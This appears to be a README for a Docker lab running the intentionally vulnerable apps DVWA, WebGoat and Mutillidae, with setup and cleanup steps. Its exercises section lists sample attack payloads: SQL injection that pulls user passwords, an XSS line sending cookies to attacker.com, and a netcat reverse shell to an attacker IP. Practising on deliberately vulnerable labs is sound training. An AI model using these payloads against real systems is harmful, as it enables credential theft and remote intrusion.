# Docker Container: Vulnerable Web Application Lab

This Docker container provides a controlled environment for practicing web application security testing.

## Container Details

- **Image**: `learn-library/vulnerable-webapp:latest`
- **Base**: Ubuntu 20.04
- **Applications**: DVWA, WebGoat, Mutillidae
- **Services**: Apache, MySQL, PHP

## Quick Start

### 1. Build and Run

```bash
# Clone the lab repository
git clone https://github.com/learn-library/vulnerable-webapp-lab.git
cd vulnerable-webapp-lab

# Build the container
docker build -t learn-library/vulnerable-webapp .

# Run the container
docker run -d -p 8080:80 -p 3306:3306 \
  --name webapp-lab \
  learn-library/vulnerable-webapp
```

### 2. Access Applications

- **DVWA**: <http://localhost:8080/dvwa>
  - Default credentials: `admin/password`
- **WebGoat**: <http://localhost:8080/webgoat>
  - Self-registration available
- **Mutillidae**: <http://localhost:8080/mutillidae>
  - No authentication required

### 3. Database Access

```bash
# Connect to MySQL
docker exec -it webapp-lab mysql -u root -p

# Default root password: vulnlab123
```

## Security Testing Exercises

### SQL Injection (DVWA)

1. Navigate to DVWA → SQL Injection
2. Set security level to "Low"
3. Test basic injection: `' OR '1'='1`
4. Extract data: `' UNION SELECT user, password FROM users #`

### Cross-Site Scripting (XSS)

1. Navigate to DVWA → XSS Reflected
2. Test basic XSS: `<script>alert('XSS')</script>`
3. Try cookie stealing: `<script>document.location='http://attacker.com/'+document.cookie</script>`

### Command Injection

1. Navigate to DVWA → Command Injection
2. Test basic injection: `; ls -la`
3. Try reverse shell: `; nc -e /bin/bash attacker_ip 4444`

## Learning Objectives

- Understand common web vulnerabilities
- Practice safe penetration testing techniques
- Learn vulnerability exploitation and mitigation
- Develop secure coding awareness

## Safety Guidelines

- **NEVER** test on real applications without permission
- Use only in isolated lab environments
- Follow responsible disclosure principles
- Respect all applicable laws and regulations

## Cleanup

```bash
# Stop and remove the container
docker stop webapp-lab
docker rm webapp-lab

# Remove the image (optional)
docker rmi learn-library/vulnerable-webapp
```

## Troubleshooting

### Container Won't Start

```bash
# Check container logs
docker logs webapp-lab

# Verify port availability
netstat -tlnp | grep :8080
```

### Database Connection Issues

```bash
# Restart MySQL service
docker exec webapp-lab service mysql restart

# Reset database
docker exec webapp-lab mysql -u root -p < /setup/reset-db.sql
```

## Advanced Configuration

### Custom Environment Variables

```bash
docker run -d \
  -p 8080:80 \
  -e MYSQL_ROOT_PASSWORD=custom_password \
  -e DVWA_ADMIN_PASSWORD=custom_admin \
  --name webapp-lab \
  learn-library/vulnerable-webapp
```

### Persistent Data

```bash
# Mount volume for persistent data
docker run -d \
  -p 8080:80 \
  -v $(pwd)/data:/var/lib/mysql \
  --name webapp-lab \
  learn-library/vulnerable-webapp
```

## Educational Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Web Application Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [DVWA Documentation](https://github.com/digininja/DVWA)
- [WebGoat User Guide](https://github.com/WebGoat/WebGoat)
